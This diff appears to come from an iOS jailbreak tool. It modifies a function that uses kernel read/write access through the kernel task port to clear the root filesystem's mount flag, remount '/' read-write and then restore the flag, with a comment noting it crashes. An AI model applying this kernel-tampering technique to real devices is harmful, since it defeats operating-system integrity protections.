@@ -75,22 +75,21 @@ int remount_rw(task_t tfp0, vm_address_t kbase) {
 	
 	//read rootfs_vnode from memory
 	uint64_t rootfs_vnode = ReadAnywhere64(OFFSET_ROOT_MOUNT_V_NODE - OFFSET_TEXT_HEADER + kbase);
+	vm_offset_t vmount_offset = 0xd0;
+	vm_offset_t vflag_offset = 0x71;
 	
-	vm_offset_t vmount_offset = 0xd0; //
-	vm_offset_t vflag_offset = 0x71; //
-	
+    // remove mnt_rootfs flag
 	uint64_t v_mount = ReadAnywhere64(rootfs_vnode + vmount_offset);
 	uint32_t v_flag = ReadAnywhere32(v_mount + vflag_offset);
-	
 	WriteAnywhere32(v_mount + vflag_offset, v_flag & ~(1 << 6));
-	
+    
+	// remount it
 	char* nmz = strdup("/dev/disk0s1s1");
 	int rv = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
 	printf("RC: %d (flags: 0x%x) %s \n", rv, v_flag, strerror(errno));
-	//NSLog(@"remounting: %d", rv);
 	
+    // set it back
 	v_mount = ReadAnywhere64(rootfs_vnode + vmount_offset);
-	
 	WriteAnywhere32(v_mount + vflag_offset, v_flag);
 	
 	int fd = open("/.bit_of_fun", O_RDONLY);
@@ -100,12 +99,8 @@ int remount_rw(task_t tfp0, vm_address_t kbase) {
 		printf("File already exists!\n");
 	}
 	close(fd);
-	
 	printf("Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
-	
-	//printf("first four values of amficache: %08x\n", rk32(find_amficache()));
-	//printf("trust cache at: %016llx\n", rk64(find_trustcache()));
-	return 0;
+	return rv;
 }
 
 
@@ -118,9 +113,7 @@ static int party_hard(void)
 			task_t kernel_task = get_kernel_task(&kbase);
 			LOG("kernel_task: 0x%x", kernel_task);
 			printf("kernel base:  0x%lx\n",kbase);
-			remount_rw(kernel_task, kbase); //do not work, crashed, just commit now
-
-			ret = 1;
+			ret = remount_rw(kernel_task, kbase); //do not work, crashed, just commit now
 	 }
 	return ret;
 }
